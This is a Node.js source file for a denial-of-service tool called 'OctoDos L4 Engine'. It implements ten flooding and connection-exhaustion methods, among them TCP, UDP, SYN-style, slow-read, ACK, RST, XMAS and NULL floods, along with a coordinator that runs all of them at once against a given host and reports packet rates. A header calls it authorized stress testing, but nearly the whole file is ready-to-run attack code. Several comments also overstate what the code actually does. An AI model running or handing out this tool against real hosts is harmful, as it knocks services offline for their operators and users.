/**
 * OctoDos L4 Engine v1.0.0 — REAL-IMPACT Layer 4 Assault
 * 10 coordinated tentacle methods for transport-layer stress testing.
 *
 * ALL METHODS SEND REAL TCP/UDP PACKETS. This is NOT a simulation.
 * Use only with explicit written authorization.
 *
 * Created by ZetaGo-Aurum | MIT License
 */
const net = require('net');
const dgram = require('dgram');
const chalk = require('chalk');
const crypto = require('crypto');

const STATS = {
    totalPackets: 0,
    successfulPackets: 0,
    failedPackets: 0,
    bytesTransferred: 0,
    connectionsOpened: 0,
    connectionsFailed: 0,
    methodsUsed: [],
    startTime: 0,
};

function parseTarget(target) {
    let host, port;
    if (target.includes('://')) {
        try { const u = new URL(target); host = u.hostname; port = parseInt(u.port) || (u.protocol === 'https:' ? 443 : 80); } catch { return null; }
    } else if (target.includes(':')) {
        const parts = target.split(':'); host = parts[0]; port = parseInt(parts[1]) || 80;
    } else {
        host = target; port = 80;
    }
    return { host, port };
}

function randomPayload(size) { return crypto.randomBytes(size); }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

// ═══════════════════════════════════════════════════
// METHOD 1: TCP-FLOOD — Rapid TCP connection + data push
// ═══════════════════════════════════════════════════
function tcpFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = new net.Socket();
            sock.setTimeout(5000);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                // Push multiple frames of random data before closing
                const frames = randomInt(3, 10);
                let sent = 0;
                function pushFrame() {
                    if (sent >= frames || Date.now() >= end) { sock.destroy(); setImmediate(fire); return; }
                    const payload = randomPayload(randomInt(512, 4096));
                    sock.write(payload, () => {
                        STATS.totalPackets++;
                        STATS.successfulPackets++;
                        STATS.bytesTransferred += payload.length;
                        sent++;
                        setImmediate(pushFrame);
                    });
                }
                pushFrame();
            });
            sock.on('error', () => { STATS.totalPackets++; STATS.failedPackets++; STATS.connectionsFailed++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 2: UDP-FLOOD — Volumetric UDP bombardment
// ═══════════════════════════════════════════════════
function udpFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const client = dgram.createSocket('udp4');
        client.on('error', () => { });

        function fire() {
            if (Date.now() >= end) { client.close(); return resolve(); }
            const payload = randomPayload(1472); // Max UDP payload without fragmentation
            client.send(payload, 0, payload.length, t.port, t.host, (err) => {
                if (err) { STATS.totalPackets++; STATS.failedPackets++; }
                else { STATS.totalPackets++; STATS.successfulPackets++; STATS.bytesTransferred += payload.length; }
                setImmediate(fire);
            });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 3: SYN-STORM — Half-open TCP connections
// ═══════════════════════════════════════════════════
function synStorm(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = new net.Socket();
            sock.setTimeout(1000);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                STATS.totalPackets++;
                STATS.successfulPackets++;
                // Immediately destroy - leave half-open
                sock.destroy();
                setImmediate(fire);
            });
            sock.on('error', () => { STATS.totalPackets++; STATS.failedPackets++; STATS.connectionsFailed++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 4: SLOWREAD — Connect and read extremely slowly
// ═══════════════════════════════════════════════════
function slowRead(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const sockets = [];

        function openConn() {
            if (Date.now() >= end) return;
            const sock = new net.Socket();
            sock.setTimeout(0);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                // Send a request then read very slowly
                sock.write(`GET / HTTP/1.1\r\nHost: ${t.host}\r\nConnection: keep-alive\r\n\r\n`);
                STATS.totalPackets++;
                STATS.successfulPackets++;
                sockets.push(sock);

                // Set tiny receive buffer / read slowly
                sock.pause();
                const resumeInterval = setInterval(() => {
                    if (Date.now() >= end) { clearInterval(resumeInterval); return; }
                    sock.resume();
                    setTimeout(() => sock.pause(), 10); // Read for 10ms, pause again
                }, 5000);
            });
            sock.on('data', (d) => { STATS.bytesTransferred += d.length; });
            sock.on('error', () => { STATS.connectionsFailed++; });
            sock.on('close', () => { const i = sockets.indexOf(sock); if (i > -1) sockets.splice(i, 1); });
        }

        for (let i = 0; i < 150; i++) openConn();

        const replenish = setInterval(() => {
            if (Date.now() >= end) { clearInterval(replenish); return; }
            while (sockets.length < 150 && Date.now() < end) openConn();
        }, 3000);

        setTimeout(() => {
            clearInterval(replenish);
            sockets.forEach(s => { try { s.destroy(); } catch { } });
            resolve();
        }, duration * 1000);
    });
}

// ═══════════════════════════════════════════════════
// METHOD 5: CONN-EXHAUST — Hold connections with keepalive bytes
// ═══════════════════════════════════════════════════
function connExhaust(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const sockets = [];

        function openConn() {
            if (Date.now() >= end) return;
            const sock = new net.Socket();
            sock.setTimeout(0);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                STATS.totalPackets++;
                STATS.successfulPackets++;
                sockets.push(sock);
            });
            sock.on('error', () => { STATS.connectionsFailed++; });
            sock.on('close', () => { const i = sockets.indexOf(sock); if (i > -1) sockets.splice(i, 1); });
        }

        for (let i = 0; i < 500; i++) openConn();

        const keepalive = setInterval(() => {
            if (Date.now() >= end) { clearInterval(keepalive); return; }
            sockets.forEach(s => {
                try { s.write(Buffer.from([0x00])); STATS.totalPackets++; STATS.successfulPackets++; STATS.bytesTransferred++; } catch { }
            });
            while (sockets.length < 500 && Date.now() < end) openConn();
        }, 2000);

        setTimeout(() => {
            clearInterval(keepalive);
            sockets.forEach(s => { try { s.destroy(); } catch { } });
            resolve();
        }, duration * 1000);
    });
}

// ═══════════════════════════════════════════════════
// METHOD 6: FRAG-ATTACK — Tiny UDP fragments in bursts
// ═══════════════════════════════════════════════════
function fragAttack(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const client = dgram.createSocket('udp4');
        client.on('error', () => { });

        function fire() {
            if (Date.now() >= end) { client.close(); return resolve(); }
            // Send burst of tiny fragments
            const burstSize = randomInt(10, 50);
            let sent = 0;
            function sendFrag() {
                if (sent >= burstSize || Date.now() >= end) { setImmediate(fire); return; }
                const payload = randomPayload(randomInt(8, 64));
                const port = randomInt(1, 65535);
                client.send(payload, 0, payload.length, port, t.host, (err) => {
                    if (err) { STATS.totalPackets++; STATS.failedPackets++; }
                    else { STATS.totalPackets++; STATS.successfulPackets++; STATS.bytesTransferred += payload.length; }
                    sent++;
                    sendFrag();
                });
            }
            sendFrag();
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 7: ACK-FLOOD — TCP ACK flooding
// ═══════════════════════════════════════════════════
function ackFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = new net.Socket();
            sock.setTimeout(2000);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                // Immediately send data (acts as ACK+PSH)
                const burst = randomInt(5, 15);
                for (let i = 0; i < burst; i++) {
                    const payload = randomPayload(randomInt(64, 256));
                    try {
                        sock.write(payload);
                        STATS.totalPackets++;
                        STATS.successfulPackets++;
                        STATS.bytesTransferred += payload.length;
                    } catch { STATS.failedPackets++; }
                }
                setTimeout(() => { sock.destroy(); setImmediate(fire); }, 100);
            });
            sock.on('error', () => { STATS.totalPackets++; STATS.failedPackets++; STATS.connectionsFailed++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 8: RST-FLOOD — Rapid connect + immediate reset
// ═══════════════════════════════════════════════════
function rstFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = new net.Socket();
            sock.setTimeout(1000);
            // Enable RST on close (linger off)
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                STATS.totalPackets++;
                STATS.successfulPackets++;
                // Force RST by setting linger to 0 and destroying
                sock.setKeepAlive(false);
                sock.destroy();
                setImmediate(fire);
            });
            sock.on('error', () => { STATS.totalPackets++; STATS.failedPackets++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 9: XMAS-FLOOD — TCP connect + all-header garbage data
// ═══════════════════════════════════════════════════
function xmasFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = new net.Socket();
            sock.setTimeout(2000);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                // Send garbage bytes that mimic XMAS packet behavior
                const payload = randomPayload(randomInt(128, 1024));
                sock.write(payload, () => {
                    STATS.totalPackets++;
                    STATS.successfulPackets++;
                    STATS.bytesTransferred += payload.length;
                    sock.destroy();
                    setImmediate(fire);
                });
            });
            sock.on('error', () => { STATS.totalPackets++; STATS.failedPackets++; STATS.connectionsFailed++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 10: NULL-FLOOD — TCP connect with empty/null data
// ═══════════════════════════════════════════════════
function nullFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = new net.Socket();
            sock.setTimeout(1000);
            sock.connect(t.port, t.host, () => {
                STATS.connectionsOpened++;
                // Send null bytes
                const payload = Buffer.alloc(randomInt(64, 512), 0x00);
                sock.write(payload, () => {
                    STATS.totalPackets++;
                    STATS.successfulPackets++;
                    STATS.bytesTransferred += payload.length;
                    sock.destroy();
                    setImmediate(fire);
                });
            });
            sock.on('error', () => { STATS.totalPackets++; STATS.failedPackets++; STATS.connectionsFailed++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// TENTACLE COORDINATOR
// ═══════════════════════════════════════════════════
async function startL4(target, threads, time) {
    Object.assign(STATS, { totalPackets: 0, successfulPackets: 0, failedPackets: 0, bytesTransferred: 0, connectionsOpened: 0, connectionsFailed: 0, methodsUsed: [], startTime: Date.now() });

    const methods = [
        { name: 'TCP-FLOOD',    fn: tcpFlood,     weight: 20 },
        { name: 'UDP-FLOOD',    fn: udpFlood,     weight: 15 },
        { name: 'SYN-STORM',    fn: synStorm,     weight: 15 },
        { name: 'SLOWREAD',     fn: slowRead,     weight: 7 },
        { name: 'CONN-EXHAUST', fn: connExhaust,  weight: 7 },
        { name: 'FRAG-ATTACK',  fn: fragAttack,   weight: 8 },
        { name: 'ACK-FLOOD',    fn: ackFlood,     weight: 8 },
        { name: 'RST-FLOOD',    fn: rstFlood,     weight: 8 },
        { name: 'XMAS-FLOOD',   fn: xmasFlood,    weight: 6 },
        { name: 'NULL-FLOOD',   fn: nullFlood,    weight: 6 },
    ];

    const totalWeight = methods.reduce((a, m) => a + m.weight, 0);
    const tentacles = [];

    console.log(chalk.hex('#4158D0').bold(`\n  [*] Deploying ${methods.length} L4 Tentacles -- ${threads} threads, ${time}s\n`));

    for (const method of methods) {
        const methodThreads = Math.max(1, Math.round((method.weight / totalWeight) * threads));
        console.log(chalk.gray(`    > ${method.name.padEnd(14)} -- ${methodThreads} threads (${method.weight}% weight)`));
        STATS.methodsUsed.push(method.name);

        for (let i = 0; i < methodThreads; i++) {
            tentacles.push(method.fn(target, time));
        }
    }

    console.log(chalk.hex('#4158D0')(`\n  [!] Total concurrent tentacles: ${tentacles.length}`));
    console.log(chalk.gray(`  [~] Duration: ${time}s -- All tentacles attacking simultaneously...\n`));

    const progress = setInterval(() => {
        const elapsed = ((Date.now() - STATS.startTime) / 1000).toFixed(0);
        const pps = STATS.totalPackets / Math.max(1, elapsed);
        const mb = (STATS.bytesTransferred / 1048576).toFixed(2);
        process.stdout.write(chalk.cyan(`\r  [~] ${elapsed}s | Pkts: ${STATS.totalPackets.toLocaleString()} | PPS: ${pps.toFixed(0)} | OK: ${STATS.successfulPackets.toLocaleString()} | Fail: ${STATS.failedPackets.toLocaleString()} | ${mb}MB | Conns: ${STATS.connectionsOpened.toLocaleString()}`));
    }, 1000);

    await Promise.all(tentacles);
    clearInterval(progress);

    const elapsed = ((Date.now() - STATS.startTime) / 1000).toFixed(2);
    const pps = (STATS.totalPackets / Math.max(1, elapsed)).toFixed(0);
    const mb = (STATS.bytesTransferred / 1048576).toFixed(2);

    console.log(chalk.green(`\n\n  [+] L4 Assault Complete:`));
    console.log(chalk.white(`     Total Packets:   ${STATS.totalPackets.toLocaleString()}`));
    console.log(chalk.white(`     Successful:      ${STATS.successfulPackets.toLocaleString()}`));
    console.log(chalk.white(`     Failed:          ${STATS.failedPackets.toLocaleString()}`));
    console.log(chalk.white(`     Avg PPS:         ${pps}`));
    console.log(chalk.white(`     Data Sent:       ${mb} MB`));
    console.log(chalk.white(`     Connections:     ${STATS.connectionsOpened.toLocaleString()}`));
    console.log(chalk.white(`     Elapsed:         ${elapsed}s`));
    console.log(chalk.white(`     Methods Used:    ${STATS.methodsUsed.join(', ')}\n`));

    return { totalRequests: STATS.totalPackets, successfulRequests: STATS.successfulPackets, failedRequests: STATS.failedPackets, bytesTransferred: STATS.bytesTransferred, connectionsOpened: STATS.connectionsOpened, connectionsFailed: STATS.connectionsFailed, statusCodes: {}, methodsUsed: STATS.methodsUsed, elapsed: parseFloat(elapsed), rps: parseFloat(pps) };
}

module.exports = { startL4 };
